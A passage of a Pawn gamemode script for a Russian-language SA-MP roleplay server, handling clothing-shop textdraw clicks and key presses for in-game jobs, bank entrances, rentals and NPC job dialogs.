   	///////////////////////////////////////////////////////////////////////////// //Егор
	/*else if(clickedid == JRPTD[17])
	{
	    if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;
	    pPressed[playerid]--;
	    new string[64];
		if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) DestroyVehicle(PI[playerid][SalonCarID]);
		PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
		if(InShop[playerid] == 1)
		{
			if(pPressed[playerid] < 0) pPressed[playerid] = sizeof(carsC)-1;
			PI[playerid][SalonCarID] = CreateVehicle(carsC[pPressed[playerid]][0],621.4212, 36.7264, 3002.7693,-90.0,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
			format(string,sizeof(string),"%s",VehicleNames[carsC[pPressed[playerid]][0]-400]);
			PlayerTextDrawSetString(playerid,JRP_TD[playerid][0],string);
			format(string,64,"%d ~y~~h~RUB",carsC[pPressed[playerid]][1]);
			PlayerTextDrawSetString(playerid,JRP_TD[playerid][1],string);
		}
		PlayerLastTick[playerid] = GetTickCount();
		LinkVehicleToInterior(PI[playerid][SalonCarID],3);
		SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
		PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);
		SetPlayerCameraPos(playerid, 628.9492, 40.5495, 3004.3596);
		SetPlayerCameraLookAt(playerid, 628.0756, 40.0657, 3004.2803);
	}
	else if(clickedid == JRPTD[18])
	{
	    if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;
	    pPressed[playerid]++;
		new string[64];
		if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) DestroyVehicle(PI[playerid][SalonCarID]);
		PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
		if(InShop[playerid] == 1)
		{
			if(pPressed[playerid] > sizeof(carsC)) pPressed[playerid] = 0;
			PI[playerid][SalonCarID] = CreateVehicle(carsC[pPressed[playerid]][0],621.4212, 36.7264, 3002.7693,-90.0,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
			format(string,sizeof(string),"%s",VehicleNames[carsC[pPressed[playerid]][0]-400]);
			PlayerTextDrawSetString(playerid,JRP_TD[playerid][0],string);
			format(string,64,"%d ~y~~h~RUB",carsC[pPressed[playerid]][1]);
			PlayerTextDrawSetString(playerid,JRP_TD[playerid][1],string);
		}
		PlayerLastTick[playerid] = GetTickCount();
		LinkVehicleToInterior(PI[playerid][SalonCarID],3);
		SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
		PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);
		SetPlayerCameraPos(playerid, 628.9492, 40.5495, 3004.3596);
		SetPlayerCameraLookAt(playerid, 628.0756, 40.0657, 3004.2803);
	}

	else if(clickedid == JRPTD[5]) ShowPlayerDialog(playerid, D_JOB+54, 1, "Основной цвет", "{FFFFFF}Введите основной цвет автомобиля:", "Принять", "Отмена");
	else if(clickedid == JRPTD[6]) ShowPlayerDialog(playerid, D_JOB+53, 1, "Цвет салона", "{FFFFFF}Введите цвет салона автомобиля:", "Принять", "Отмена");
	else if(clickedid == JRPTD[8]) ShowPlayerDialog(playerid, D_JOINCARS+5, DIALOG_STYLE_MSGBOX, "Отмена покупки", "{FFFFFF}Вы хотите отменить покупку транспорта?", "Да", "Нет");
    else if(clickedid == JRPTD[7])
    {
        STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{FFFFFF}Вы хотите приобрести %s за %i руб?",VehicleNames[GetVehicleModel(PI[playerid][SalonCarID])-400],carsC[pPressed[playerid]][1]);
		ShowPlayerDialog(playerid,D_JOINCARS+4,DIALOG_STYLE_MSGBOX,"Купить транспорт",STRING_GLOBAL,"Да","Нет");
	}*/
	else if(ClothesRound[playerid] == 2)
	{
		new string[170];
		if(clickedid == Button[1])
		{
			if(PI[playerid][pSex] == 1)
			{
  			    if(SelectCharPlace[playerid] == sizeof(JoinShopM)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
				format(string, sizeof(string), "~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~ЦЕНА: ~g~%iр", JoinShopM[SelectCharPlace[playerid]][1]);
			}
			else
			{
				if(SelectCharPlace[playerid] == sizeof(JoinShopF)-1) SelectCharPlace[playerid] = 0;
				else SelectCharPlace[playerid]++;
				SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
				format(string, sizeof(string), "~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~ЦЕНА: ~g~%iр", JoinShopF[SelectCharPlace[playerid]][1]);
			}
			GameTextForPlayer(playerid, string, 2000, 3);
		}
		else if(clickedid == Button[0])
		{
			if(PI[playerid][pSex] == 1)
			{
   			    if(SelectCharPlace[playerid] == 0) SelectCharPlace[playerid] = sizeof(JoinShopM)-1;
				else SelectCharPlace[playerid]--;
				SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
				format(string, sizeof(string), "~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~ЦЕНА: ~g~%iр", JoinShopM[SelectCharPlace[playerid]][1]);
			}
			else
			{
				if(SelectCharPlace[playerid] == 0) SelectCharPlace[playerid] = sizeof(JoinShopF)-1;
				else SelectCharPlace[playerid]--;
				SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
				format(string, sizeof(string), "~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~ЦЕНА: ~g~%iр", JoinShopF[SelectCharPlace[playerid]][1]);
			}
			GameTextForPlayer(playerid, string, 2000, 3);
		}
		else if(clickedid == Button[2])
		{
			TogglePlayerControllable(playerid,true);
			SetPlayerPos(playerid, -910.7529,1202.5765,1002.0000);
			SetPlayerFacingAngle(playerid, 90.7828);
			SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
			SetPlayerInterior(playerid, 5);
			InShopSkin[playerid] = 0;
			SelectCharPlace[playerid] = 0;
			ClothesRound[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);
			for(new i; i < 6; i++) TextDrawHideForPlayer(playerid, Button[i]);
			CancelSelectTextDraw(playerid);
		}
		else if(clickedid == Button[3])
		{
		    new b = GetPVarInt(playerid, "PlayerBizz");
		    new price = (PI[playerid][pSex] == 1) ? (JoinShopM[SelectCharPlace[playerid]][1]) : (JoinShopF[SelectCharPlace[playerid]][1]);
			if(GetMoney(playerid) < price) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств на счету!");
			PI[playerid][pModel] = (PI[playerid][pSex] == 1) ? (JoinShopM[SelectCharPlace[playerid]][0]) : (JoinShopF[SelectCharPlace[playerid]][0]);
			MysqlUpdatePlayerInt(playerid, "model", PI[playerid][pModel]);
			GiveMoney(playerid, -price);
			if(BizzInfo[b][bProduct] > 0)
			{
				BizzInfo[b][bMoney] += price / 4;
				BizzPay[b] += price / 4;
				BizzInfo[b][bProduct] -= price / 16;
				MysqlUpdateBizzInt(b, "money", BizzInfo[b][bMoney]);
				MysqlUpdateBizzInt(b, "product", BizzInfo[b][bProduct]);
			}
			TogglePlayerControllable(playerid,true);
			SetPlayerPos(playerid, -910.7529,1202.5765,1002.0000);
			SetPlayerFacingAngle(playerid, 90.7828);
			SetPlayerVirtualWorld(playerid, InShopSkin[playerid]);
			SetPlayerInterior(playerid, 5);
			InShopSkin[playerid] = 0;
			SelectCharPlace[playerid] = 0;
			ClothesRound[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			SetPlayerSkin(playerid, PI[playerid][pModel]);
			new house12 = 0;
			for(new i = TOTALHOUSE; i > 0; i --)
			{
				if(!strcmp(HouseInfo[i][hOwner],GetName(playerid),true)) house12++;
			}
			if(house12)
			{
			    new str[42], oneskin[14], twoskin[14], threeskin[14];

			    if(!PI[playerid][pSkin][0]) format(oneskin, sizeof(oneskin), "{F04245}(нет)");
				else format(oneskin, sizeof(oneskin), "{63BD4E}(%i)", PI[playerid][pSkin][0]);
			    if(!PI[playerid][pSkin][1]) format(twoskin, sizeof(twoskin), "{F04245}(нет)");
				else format(twoskin, sizeof(twoskin), "{63BD4E}(%i)", PI[playerid][pSkin][1]);
			    if(!PI[playerid][pSkin][2]) format(threeskin, sizeof(threeskin), "{F04245}(нет)");
				else format(threeskin, sizeof(threeskin), "{63BD4E}(%i)", PI[playerid][pSkin][2]);

			    format(str, sizeof(str), "{FFFFFF}Полка №1 %s\n", oneskin);
			    strcat(string, str);
			    format(str, sizeof(str), "{FFFFFF}Полка №2 %s\n", twoskin);
			    strcat(string, str);
			    format(str, sizeof(str), "{FFFFFF}Полка №3 %s\n", threeskin);
			    strcat(string, str);
			    strcat(string, "{FFFFFF}Оставить одежду на себе");

				ShowPlayerDialog(playerid, 1431, DIALOG_STYLE_LIST, "Куда положить одежду", string, "Выбрать", "");
			}
			for(new i; i < 6; i++) TextDrawHideForPlayer(playerid, Button[i]);
			CancelSelectTextDraw(playerid);
			SendClientMessage(playerid, COLOR_GREY, "Вы купили одежду в магазине.");

			FreezePlayer(playerid, 2500);
		}
	}
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
    if(playerid == INVALID_PLAYER_ID) return SKick(playerid, 7434);
    if(GetPlayerMenu(playerid) == Menu:INVALID_MENU) return SKick(playerid, 7435);
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return 1;
}
#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))

#define HOLDING(%0) \
	((newkeys & (%0)) == (%0))

#define RELEASED(%0) \
	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

#define KEY_AIM (128)

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    if(PlayerLogged[playerid] == false) return 1;

	if(PRESSED(KEY_YES))
		callcmd::yes(playerid, "");

	if(PRESSED(KEY_NO))
		callcmd::no(playerid, "");

    if(!IsPlayerInAnyVehicle(playerid) && PI[playerid][P_JOB] > 0 && (newkeys & KEY_JUMP) && GoDerevo[playerid] == 1)
    {
   		switch(PI[playerid][P_JOB])
   		{
			case JOB_GRUZ_WOOD:
			{
				DisablePlayerCheckpoint(playerid);
			    RemovePlayerAttachedObject(playerid, 4);
				ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
				SetPlayerCheckpoint(playerid,907.0281,473.4711,12.0054,2.0);
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы уронили древесину.");
				SendClientMessage(playerid, COLOR_LIME, STRING_GLOBAL);
				GoDerevo[playerid] = 0;
				return true;
			}
		}
	}
	if(!IsPlayerInAnyVehicle(playerid) && PI[playerid][P_JOB] > 0 && (newkeys & KEY_SPRINT || newkeys & KEY_JUMP) && (GetPVarInt(playerid, "relate") != 0 || GetPVarInt(playerid, "LessStatus") != 0))
	{
		switch(PI[playerid][P_JOB])
		{
			case JOB_MINER:
			{
				DisablePlayerCheckpoint(playerid);
				//new idx = random(10);
				//SetPlayerCheckpoint(playerid, coord_checkpoint_miner[idx][0], coord_checkpoint_miner[idx][1], coord_checkpoint_miner[idx][2], 2.0);
				SetPlayerAttachedObject(playerid, 1, 18634, 6, 0.075000,0.002999,0.154000, 98.399978,-69.600013,1.100000);
				RemovePlayerAttachedObject(playerid,2);// забрали тачку
				RemovePlayerAttachedObject(playerid,3);// забрали тачку
				DeletePVar(playerid, "relate");
				SendClientMessage(playerid, -1, "Вы уронили груз из рук... Возвращайтесь обратно");
			}
			case JOB_FARMER:
			{
				RemovePlayerAttachedObject(playerid, 2);
				SetPVarInt(playerid, "relate", 0);
				DisablePlayerCheckpoint(playerid);
				new idx = random(sizeof coord_checkpoint_farmer);
				SetPlayerCheckpoint(playerid, coord_checkpoint_farmer[idx][0], coord_checkpoint_farmer[idx][1], coord_checkpoint_farmer[idx][2]-1.0, 2.0);
				SendClientMessage(playerid, -1, "Вы уронили сено... Возвращайтесь обратно");
			}
			case JOB_LOGGER:
			{
				DisablePlayerCheckpoint(playerid);
			    RemovePlayerAttachedObject(playerid, 4);
				ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
		    	DeletePVar(playerid, "Derevo");
		    	SetPVarInt(playerid, "LessProgress", 0);
		    	SetPVarInt(playerid, "LessStatus", 0);
				SetPlayerAttachedObject(playerid, 3, 341, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы уронили древесину.");
				SendClientMessage(playerid, COLOR_LIME, STRING_GLOBAL);
				GoDerevo[playerid] = 0;
				return true;
				//SetPlayerCheckpoint(playerid,Derevo[GetPVarInt(playerid, "Derevo")][0],Derevo[GetPVarInt(playerid, "Derevo")][1],Derevo[GetPVarInt(playerid, "Derevo")][2], 3.0);
			}
			case JOB_GUN_COLLECTOR:
			{
				DisablePlayerCheckpoint(playerid);
				RemovePlayerAttachedObject(playerid,3);
				new idx = random(sizeof coord_checkpoint_gun_collector);
				SetPlayerCheckpoint(playerid, coord_checkpoint_gun_collector[idx][0], coord_checkpoint_gun_collector[idx][1], coord_checkpoint_gun_collector[idx][2]-1.0, 2.0);
				SetPVarInt(playerid, "relate", 0);
			}
		}
	}


	if(PRESSED(KEY_YES))
	{
		new vehicleid = GetPlayerVehicleID(playerid);

		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && GetVehicleData(vehicleid, veh_owner_id) != INVALID_PLAYER_ID)
		{
			if(g_vehicle[vehicleid][veh_improve] == 0) return 1;

			if(PI[playerid][P_TYPE_SPEED] == g_vehicle[vehicleid][veh_improve])
			{
				PI[playerid][P_TYPE_SPEED] = 0;
			}
			else if(g_vehicle[vehicleid][veh_improve] > PI[playerid][P_TYPE_SPEED])
			{
				PI[playerid][P_TYPE_SPEED] += 1;
			}

			new speed_name[4][] = {"~b~normal", "~b~stage 1", "~b~stage 2", "~b~stage 3"};

			GameTextForPlayer(playerid, speed_name[PI[playerid][P_TYPE_SPEED]], 1000, 4);
		}
	}
	if(PRESSED(KEY_JUMP))
	{
		new vehicleid = GetPlayerVehicleID(playerid);

	    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && GetVehicleData(vehicleid, veh_owner_id) != INVALID_PLAYER_ID)
	    {
			new UnSpeed;
			switch(g_vehicle[vehicleid][veh_improve])
			{
			    case 1:UnSpeed = 30;
			    case 2:UnSpeed = 40;
			    case 3:UnSpeed = 50;
			}
			_SetVehicleSpeed(vehicleid, GetPlayerVehicleSpeedZ(playerid)-UnSpeed);
		}
	}

	if(PI[playerid][P_JOB] == JOB_MINER && GetPlayerSkin(playerid) == 260 && GetPVarInt(playerid, "relate") == 0 && GetPlayerState(playerid) == 1 && PRESSED(KEY_FIRE))
	{
		for(new i = 0; i != sizeof coord_checkpoint_miner; i ++)
		{
	 		if(IsPlayerInRangeOfPoint(playerid,1.5,coord_checkpoint_miner[i][0],coord_checkpoint_miner[i][1],coord_checkpoint_miner[i][2]))
			{
			    TogglePlayerControllable(playerid, 0);
				ClearAnimations(playerid);
				ApplyAnimation(playerid,"BASEBALL","Bat_4",4.1,1,0,0,1,11000);
				DisablePlayerCheckpoint(playerid);
	 			SetTimerEx("ExtractionPlayer", 9800, false, "i",playerid);
			 	SetPVarInt(playerid, "relate", 1);
			  	//SetPlayerCheckpoint(playerid,1673.0930,1455.0308,453.0168,1.0);
	  		}
  		}
		return 1;
	}

	if(PI[playerid][P_JOB] == JOB_LOGGER && PRESSED(KEY_FIRE))
	{
	    if(GetPVarInt(playerid,"LessProgress") >= 100) return 1;
   		for(new i = 0; i != sizeof coord_checkpoint_les; i ++)
   		{
		    if(IsPlayerInRangeOfPoint(playerid,2.5,coord_checkpoint_les[i][0], coord_checkpoint_les[i][1], coord_checkpoint_les[i][2]))
			{
			    ApplyAnimation(playerid, "CHAINSAW", "weapon_csaw", 4.0, 0, 0, 0, 0, 0);
	            new animlib[30], animname[30];
				if(GetString(animlib[playerid], "CHAINSAW") && GetString(animname[playerid], "weapon_csaw"))
				{
					SetPVarInt(playerid, "LessProgress", GetPVarInt(playerid, "LessProgress") + 5);
					SetPlayerCheckpoint(playerid,coord_checkpoint_les[i][0], coord_checkpoint_les[i][1], coord_checkpoint_les[i][2],1.0);
					return 1;
				}
	  		}
		}
	}


	if(newkeys == KEY_CTRL_BACK)
	{
	    /*for(new i = TOTALBIZZ; i > 0; i --)
	    {
		    if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])	&& BizzInfo[i][bType] == 2)
		    {
		        if(PlayersMenu[playerid] > 0) return SendMess(playerid, MSG_BAC_TEXT_DRAW);
		        for(new v; v < 5; v++) PlayerTextDrawShow(playerid, PlayerMenu[playerid][v]);
				for(new v; v < 3; v++) TextDrawShowForPlayer(playerid, KolvDialog[v]);
				for(new v; v < 3; v++) PlayerTextDrawShow(playerid, NameDialog[playerid][v]);
				PlayerTextDrawSetString(playerid, PlayerMenu[playerid][2], "Меню АЗС");
				PlayerTextDrawSetString(playerid, NameDialog[playerid][0], "Топливо");
				PlayerTextDrawSetString(playerid, NameDialog[playerid][1], "Канистра");
				PlayerTextDrawSetString(playerid, NameDialog[playerid][2], "Инструменты");
				PlayersMenu[playerid] = 3;//3 - АЗС
				SelectTextDraw(playerid, 0xFF4040AA);
			    SetPVarInt(playerid, "FuelBizzID", i);
		    }
	    }*/
		if((IsAArmy(playerid) || IsAMafia(playerid)) && IsPlayerInDynamicArea(playerid, AreaInfo[arLoadPatr])) // берет со склада оружие
		{
			if(gGunWorkWH[2] < 300) return SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно патронов");
			if(!GetPVarInt(playerid, "carryammo"))
			{
				gGunWorkWH[2] -= 300;
				SetPlayerFacingAngle(playerid, 0.0);
				ClearAnimations(playerid);
				ApplyAnimation(playerid, "CARRY", "liftup", 1.0, 0, 1, 1, 0, 0, 1);
				SetTimerEx("CarryDelay", 1000, false, "i", playerid);
				ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1); // анимация, что несет
				SetPlayerAttachedObject(playerid,3,2969,1,0.075578,0.407083,0.000000,1.248928,97.393852,359.645050,1.000000,1.000000,1.000000); // ящик
				SetPVarInt(playerid, "carryammo", 300);
				UpdateWH();
			}
		}
	}
	//FIX PICK
	if(newkeys & KEY_WALK)
	{
		for(new idx; idx < MAX_BOTTLES; idx ++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, coord_bottles_pickup[idx][0], coord_bottles_pickup[idx][1], coord_bottles_pickup[idx][2]))
			{
				if(g_bottles[playerid][idx] != 0)
					return SendClientMessage(playerid, COLOR_RED, "Вы уже подобрали эту бутылку");

				if(PI[playerid][pBottles] + 1 > PI[playerid][pMaxBottles])
					return SendClientMessage(playerid, COLOR_RED, "У Вас недостаточно места. Купите сумки или тележку в магазине 24/7");

				PI[playerid][pBottles] ++;

				MeAction(playerid, "подобрал(а) бутылку");

				ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL,144,"{FF8000}Бутылок собрано: {ffffff}%d",PI[playerid][pBottles]);
				SendClientMessage(playerid,COLOR_GREEN,STRING_GLOBAL);

				g_bottles[playerid][idx] = 1;

				DestroyPlayerObject(playerid, g_bottles_object[playerid][idx]);
				g_bottles_object[playerid][idx] = INVALID_OBJECT_ID;

				SavePlayerBottles(playerid);
			}
		}
		for(new i = 0; i != sizeof coord_arend_scooter; i ++)
		{
			if(IsPlayerInRangeOfPoint(playerid,3.0,coord_arend_scooter[i][0],coord_arend_scooter[i][1],coord_arend_scooter[i][2]))
			{
				ShowPlayerDialog
				(
					playerid, DIALOG_AREND_SCOOTER, DIALOG_STYLE_MSGBOX,
					"{FFFFFF}Арендатор",
					"{FFFFFF}Здарова, устал на ногах бегать?\n"\
					"Я могу тебе в аренду скутер дать на некоторое время, всего за {37c268}50 рублей {FFFFFF}берешь?",
					"Да", "Нет"
				);
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 1850.3457,2035.1680,16.9742))//вход в банк батырка
		{
			FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 1168.5963,500.1310,999.3750);
	    	SetPlayerFacingAngle(playerid, 91.3234);
	    	SetCameraBehindPlayer(playerid);
	    	SetPlayerVirtualWorld(playerid, 4);
			SetPlayerInterior(playerid, 3);
    	}
	   	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1171.7363,500.1838,999.4219) && GetPlayerVirtualWorld(playerid) == 4)//выход с банка батыка
	    {
	        FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 1850.5662,2041.0391,15.8794);
	    	SetPlayerFacingAngle(playerid, 316.6323);
	    	SetCameraBehindPlayer(playerid);
			SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerInterior(playerid, 0);
	    }

   		if(IsPlayerInRangeOfPoint(playerid, 2.0, 2376.6753,-2139.2605,22.0776))//вход в банк батырка
		{
			FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 1168.5963,500.1310,999.3750);
	    	SetPlayerFacingAngle(playerid, 91.3234);
	    	SetCameraBehindPlayer(playerid);
	    	SetPlayerVirtualWorld(playerid, 5);
			SetPlayerInterior(playerid, 3);
    	}
	   	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1171.7363,500.1838,999.4219) && GetPlayerVirtualWorld(playerid) == 5)//выход с банка батыка
	    {
	        FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 2376.5903,-2142.6621,21.9579);
	    	SetPlayerFacingAngle(playerid, 178.2774);
	    	SetCameraBehindPlayer(playerid);
			SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerInterior(playerid, 0);
	    }

   		if(IsPlayerInRangeOfPoint(playerid, 2.0, 62.9153,843.3816,12.1716))//вход в банк батырка
		{
			FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 1168.5963,500.1310,999.3750);
	    	SetPlayerFacingAngle(playerid, 91.3234);
	    	SetCameraBehindPlayer(playerid);
	    	SetPlayerVirtualWorld(playerid, 6);
			SetPlayerInterior(playerid, 3);
    	}
	   	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1171.7363,500.1838,999.4219) && GetPlayerVirtualWorld(playerid) == 6)//выход с банка батыка
	    {
	        FreezePlayer(playerid, 1500);
			SetPlayerPos(playerid, 64.1008,846.3574,12.1460);
	    	SetPlayerFacingAngle(playerid, 340.1639);
	    	SetCameraBehindPlayer(playerid);
			SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerInterior(playerid, 0);
	    }
   		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1161.6501,496.9028,999.3750))
			ShowPlayerBankMenu(playerid);
		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1159.1920,496.8595,999.3750))
			ShowPlayerBankMenu(playerid);
		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1156.6777,496.8596,999.3750))
			ShowPlayerBankMenu(playerid);
		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1154.2179,496.8595,999.3750))
			ShowPlayerBankMenu(playerid);
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 441.6960,-76.2647,3002.0000))
		{
			ShowPlayerDialog
			(
				playerid, D_BUYNUMBER, 2, "Выберите страну",
				"{FFCC00}1.{ffffff} Номера RUS\t{FFCC00}10000р\n"\
				"{FFCC00}2.{ffffff} Номера BY\t\t{FFCC00}10000р\n"\
				"{FFCC00}3.{ffffff} Номера UA\t\t{FFCC00}10000р\n"\
				"{FFCC00}4.{ffffff} Номера KZ\t\t{FFCC00}10000р",
				"Принять", "Отмена"
			);
		}
		if(IsPlayerInRangeOfPoint(playerid, 2, -881.8564,1180.4720,10.5098))
        {
	        if(GetPVarInt(playerid, "TruckerJob") == 1) return SendClientMessage(playerid, COLOR_RED, "Вы уже арендуете грузовик");
		    if(PI[playerid][pJob] != JOB_TRUCK)
		    {
				SendClientMessage(playerid, COLOR_RED, "Вы не работаете дальнобойщиком!");
				return 1;
		    }
		    else
		    {
		    	if(GetPVarInt(playerid, "ParkTime") > gettime()) return SendClientMessage(playerid, COLOR_LIME, "Парковка занята, ожидайте 15 секунд");
      			ShowPlayerDialog(playerid,ArendTruckerDialog,DIALOG_STYLE_LIST,"{FFCC00}Выберите уровень:","{FFFFFF}Avia A31\t\t{FFCC00}0 уровень{ffffff}\nScania (Грузовик)\t{FFCC00}5 уровень{ffffff}\nMercedes-Benz\t\t{FFCC00}15 уровень{FFFFFF}","Выбрать","Отмена");
		    }
		}
		if(IsPlayerInRangeOfPoint(playerid,2.0,-805.5324,-1225.3234,44.4454))
		{
			if(GetFermData(F_LOCK) == 1)
				return SendClientMessage(playerid, C_RED, "Ферма закрыта");

			if(PI[playerid][P_JOB] == JOB_NONE)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_START_JOB_FARMER, DIALOG_STYLE_MSGBOX,
					"Григорий",
					"{FFFFFF} Урожай растет, не хватает рабочих рук,\n"\
					"{FFFFFF} предлогаю тебе подзаработать.\n"\
					"{FFFFFF} Работа не сложная, но вознаграждение достойное!\n"\
					"{FFFFFF} Согласен?",
					"Да","Нет"
				);
				ShowPlayerDialog
				(
					playerid, DIALOG_START_JOB_FARMER, DIALOG_STYLE_LIST,
					"{f6e58d}Работа на ферме",
					"Уборка поля\t\t{FFCC00}0 уровень\n"\
					"Работа на тракторе\t{FFCC00}3 уровень\n"\
					"Уборка на комбайне\t{FFCC00}5 уровень\n"\
					"Перевозка урожая\t{FFCC00}10 уровень\n"\
					"Узнать текущие зарплаты на ферме.",
					"Далее", "Закрыть"
				);
			}
			else if(PI[playerid][P_JOB] == JOB_FARMER)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_END_JOB_FARMER, DIALOG_STYLE_MSGBOX,
					"Григорий",
					"Вы хотите закончить работу?",
					"Да","Нет"
				);
			}
		}
 		if(IsPlayerInRangeOfPoint(playerid, 1.0, 1067.7772,110.9629,1049.7478))
        {
			ShowPlayerDialog
			(
				playerid, DIALOG_AUTOSCHOOL_CAR, DIALOG_STYLE_MSGBOX,
				"{ffd83d}Водительские права",
				!"{ffffff}Добро пожаловать в автошколу\n\n"\
				"Перед началом сдачи экзамена в Автошколе, советуем изучить ПДД\n"\
				"ПДД - Важная база знаний при вождение транспортных средств\n"\
				"Если не знать ПДД, то можно допустить можно ошибок и в самом легком случае\n"\
				"отделаться штрафом, а если не повезет, то и в ДТП попасть!\n"\
				"Для прохождения теста, нужно ответить на 5 вопросов без ошибок\n"\
				"Каждая новая попытка стоит 1000р\n\n"\
				"Готовы приступить?", !"Да", !"Нет"
			);
    	}
 		if(IsPlayerInRangeOfPoint(playerid,2.0,879.9373,510.1894,13.2385))
		{
			if(PI[playerid][P_JOB] == JOB_NONE)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_GRUZ, DIALOG_STYLE_MSGBOX,
					"Витёк",
					"{FFFFFF} Склады полнеют, нужно опустощать\n"\
					"{FFFFFF} Тебе нужно тоскать дерево с амбара на склад!!\n"\
					"{FFFFFF} Согласен?",
					"Да","Нет"
					);
			}
			else if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_GRUZ, DIALOG_STYLE_MSGBOX,
					"Витёк.",
					"Вы хотите закончить работу?",
					"Да","Нет"
				);
			}
		}
     	if(IsPlayerInRangeOfPoint(playerid,2.0,787.2955,500.0397,12.0135))
		{
			if(PI[playerid][P_JOB] == JOB_NONE)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_START_JOB_LOGGER, DIALOG_STYLE_MSGBOX,
					"Василий",
					"{FFFFFF} О, я вижу ты решил подзаработать?\n"\
					"{FFFFFF} Хватай форму, и вперед лес валить. За 1 кг готов дать тебе 3 рублей\n"\
					"{FFFFFF} Согласен?",
					"Да","Нет"
					);
			}
			else if(PI[playerid][P_JOB] == JOB_LOGGER)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_START_JOB_LOGGER, DIALOG_STYLE_MSGBOX,
					"Василий.",
					"Вы хотите закончить работу?",
					"Да","Нет"
				);
			}
		}
		if(IsPlayerInRangeOfPoint(playerid,2.0,1528.7589,1441.1196,455.9069))
		{
			if(PI[playerid][P_JOB] == JOB_NONE)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_START_JOB_MINER, DIALOG_STYLE_MSGBOX,
					"Анатолий",
					"{FFFFFF}Рабочая сила? Это хорошо\n"\
					"{FFFFFF}Области не хватает металла, не хочешь подзаработать?\n"\
					"{FFFFFF}Нужно спуститься в шахту и добывать металл. Согласен?",
					"Да","Нет"
					);
			}
			else if(PI[playerid][P_JOB] == JOB_MINER)
			{
				ShowPlayerDialog
				(
					playerid,DIALOG_START_JOB_MINER, DIALOG_STYLE_MSGBOX,
					"Анатолий",
					"Вы хотите закончить работу?",
					"Да","Нет"
				);
			}
		}
		if(PI[playerid][P_IN_ENTRANCE] != -1)
		{
			for(new i; i < sizeof g_area_rooms; i ++)
			{
				if(IsPlayerInDynamicArea(playerid, g_area_rooms[i]))
				{
					new roomid = g_area_rooms[i] - g_area_rooms[0];

					ShowPlayerRoomInfo(playerid, PI[playerid][P_IN_ENTRANCE], roomid);

					break;
				}
			}

